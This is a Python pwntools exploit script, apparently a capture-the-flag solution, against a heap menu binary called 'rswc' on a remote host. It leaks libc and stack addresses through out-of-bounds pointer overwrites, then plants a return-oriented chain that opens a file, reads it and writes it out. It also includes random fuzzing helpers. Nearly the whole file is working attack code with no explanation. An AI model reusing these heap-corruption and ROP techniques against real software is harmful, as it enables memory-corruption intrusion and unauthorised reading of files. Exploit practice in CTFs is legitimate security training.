from pwn import *
import sys
import random
import time, threading
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'


class MyThread(threading.Thread):
	def __init__(self, func, ip, port):  
		threading.Thread.__init__(self) 
		self.func = func
		self.ip = ip
		self.port = port
  
	def run(self):  
		self.func(self.ip, self.port, 0)  
  
	def GetFlag(self):  
		return self.flag  



def Alloc(p, size):
	p.recvuntil('> ')
	p.sendline('0')
	p.recvuntil('size: ')
	p.sendline(str(size))

def Edit(p, index, content):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('index: ')
	p.sendline(str(index))
	p.recvuntil('content: ')
	p.sendline(content)

def Show(p, index):
	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(index))

def Delete(p, index):
	p.recvuntil('> ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(index))
		

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./rswc')
		gdb.attach(p, '\nc')
	else:
		p = remote(ip, port)
		p.sendline('ulimit -s unlimited')
		p.sendline('./rswc')
		libc = ELF('./libc.so.6')

	for i in range(0xfe):
		# log.info('round : ' + str(i))
		Alloc(p, 0x10)
		# Edit(p, 0, str(i))
	Alloc(p, 0x40)
	Edit(p, 0xfe, p64(0) * 2 + p64(0x602010) + p64(0x40))
	Show(p, 0xfe)
	p.recvuntil('content: ')
	libc.address = u64(p.recvuntil('\n')[: -1].ljust(8, '\x00')) - libc.symbols['puts']
	log.info('libc address is : ' + hex(libc.address))

	Edit(p, 0xfd, p64(0) * 2 + p64(libc.symbols['environ'] - 0x10) + p64(0x40))
	Show(p, 0xfd)
	p.recvuntil('content: ')
	stack_addr = u64(p.recvuntil('\n')[: -1].ljust(8, '\x00'))
	log.info('stack address is : ' + hex(stack_addr))

	Edit(p, 0xfc, p64(0) * 2 + p64(stack_addr - 0x110 - 0x10) + p64(0x40))

	poprdi = libc.address + 0x0000000000021102
	poprsi = libc.address + 0x00000000000202e8
	poprdx = libc.address + 0x0000000000001b92
	straddr = 0x602000 + 0xa00

	shellcode = p64(poprdi) + p64(0)
	shellcode += p64(poprsi) + p64(straddr)
	shellcode += p64(poprdx) + p64(0x100)
	shellcode += p64(libc.symbols['read'])
	shellcode += p64(poprdi) + p64(straddr)
	shellcode += p64(poprsi) + p64(0)
	shellcode += p64(libc.symbols['open'])
	shellcode += p64(poprdi) + p64(3)
	shellcode += p64(poprsi) + p64(straddr)
	shellcode += p64(poprdx) + p64(0x100)
	shellcode += p64(libc.symbols['read'])
	shellcode += p64(poprdi) + p64(1)
	shellcode += p64(poprsi) + p64(straddr)
	shellcode += p64(poprdx) + p64(0x100)
	shellcode += p64(libc.symbols['write'])

	Edit(p, 0xfc, shellcode)
	# Show(p, 0x110)
	# Alloc(p, 0x10)
	# Alloc(p, 0x10)
	# Alloc(p, 0x10)
	# Alloc(p, 0x10)
	# Delete(p, 0)
	# Delete(p, 0)
	# Delete(p, 0)
	# Delete(p, 0)
	# Delete(p, 0)
	# Alloc(p, 0x10 + 1)
	# Alloc(p, 0x10 - 1)
	# Alloc(p, 0x10 + 1)
	# Alloc(p, 0x10 - 1)
	# Alloc(p, 0x10)
	# Delete(p, 0)
	# Delete(p, 0)
	# Delete(p, 0)
	# Delete(p, 0)
	# Delete(p, 0)
	# Alloc(p, -0x10)
	# Edit(p, 0, 'a' * 0xf0)
	# Alloc(p, 0x100 - 0x20)
	# Alloc(p, -0x80)

	p.interactive()

def NOP(ip, port, debug):
	if debug == 1:
		p = process('./rswc')
		gdb.attach(p, '\nc')
	else:
		p = remote(ip, port)
		p.sendline('./rswc')

	# p.interactive()
	time.sleep(2000)

def AllocFuzz(p):
	global AllocList
	size = random.randint(3, 0x100)
	log.info('Alloc(' + str(size) + ')')

	p.recvuntil('> ')
	p.sendline('0')
	p.recvuntil('size: ')
	p.sendline(str(size))
	data = p.recvline()
	if 'invalid size' in data:
		log.info('\rAlloc size error!')
		# return 0
	elif 'failed to allocate memory' in data:
		log.info('\rAlloc memory error!')
		# return 0
	elif '\n' == data:
		AllocList = [size] + AllocList
		log.info('\rAlloc sucess! : ' + str(AllocList))
		# return 1
	else:
		log.info('\rAlloc unknow!')
		sys.exit(0)
		# return 0

def EditFuzz(p):
	global AllocList
	if len(AllocList) == 0:
		return
	index = random.randint(0, len(AllocList) - 1)
	content = ''
	asii = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}'
	l = random.randint(1, AllocList[index] - 2)
	for i in range(l):
		content += random.choice(asii)
	log.info('Edit(' + str(index) + ', ' + content +')')

	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('index: ')
	p.sendline(str(index))
	data = p.recvn(9)
	if 'not found' in data:
		log.info('\rEdit not found!')
		# return 0
	elif 'content: ' in data:
	# p.recvuntil('content: ')
		log.info('\rEdit sucess!')
		p.sendline(content)
		# return 1;
	else:
		log.info('\rEdit unknow!')
		sys.exit(0)
		# return 0

def ShowFuzz(p):
	global AllocList
	if len(AllocList) == 0:
		return
	index = random.randint(0, len(AllocList) - 1)
	log.info('Show(' + str(index) + ')')

	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(index))
	data = p.recvline()
	if 'not found' in data:
		log.info('\rShow not found!')
		# return 0
	elif 'memo no' in data:
	# p.recvuntil('content: ')
		log.info('\rShow sucess!')
		p.recvline()
		p.recvline()
		# return 1;
	else:
		log.info('\rShow unknow!')
		sys.exit(0)

def DeleteFuzz(p):
	global AllocList
	if len(AllocList) == 0:
		return
	index = random.randint(0, len(AllocList) - 1)
	log.info('Delete(' + str(index) + ')')

	p.recvuntil('> ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(index))
	data = p.recvline()
	if 'not found' in data:
		log.info('\rDelete not found!')
		# return 0
	elif '\n' == data:
	# p.recvuntil('content: ')
		AllocList = AllocList[ : index] + AllocList[index + 1 : ]
		log.info('\rDelete sucess! : ' + str(AllocList))
		# return 1;
	else:
		log.info('\rDelete unknow!')
		sys.exit(0)

AllocList = []

def Fuzz():
	fuclist = [AllocFuzz, EditFuzz, ShowFuzz, DeleteFuzz]
	p = process('./rswc')
	# raw_input('debug : ')

	
	# while 1:
	# 	index = random.randint(0, 3)
	# 	fuclist[index](p)
	Alloc(p, 0x10)
	for i in range(0x100):
		Edit(p, 0, 'a' * 0xf)
	p.interactive()

if __name__ == '__main__':
	# Fuzz()
	GameStart('172.16.13.11', 31354, 0)
	# ip = '172.16.13.11'
	# port = 31354
	# FuncList = []
	# T = []
	# while 1:
	# 	for i in range(5):
	# 		FuncList.append(NOP)
	# 	FuncList[3] = GameStart

	# 	for func in FuncList:
	# 		T.append(MyThread(func, ip, port))

	# 	for t in T:
	# 		t.start()

	# 	for t in T:
	# 		t.join()
